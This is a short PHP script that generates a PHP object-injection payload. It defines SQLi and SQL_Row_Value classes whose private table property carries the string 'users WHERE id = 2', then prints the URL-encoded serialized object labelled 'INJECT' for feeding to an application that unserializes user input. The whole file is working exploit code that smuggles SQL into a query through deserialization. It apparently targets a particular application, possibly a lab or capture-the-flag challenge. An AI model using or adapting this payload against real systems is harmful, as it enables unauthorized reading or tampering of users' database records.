<?php
class SQL_Row_Value { 
    private $_table = "users WHERE id = 2"; 
}
class SQLi { 
    protected $obj; 
    function __construct(){ 
        $this->obj = new SQL_Row_Value(); 
    } 
}
echo "INJECT:\n" . urlencode(serialize(new SQLi())) . "\n";
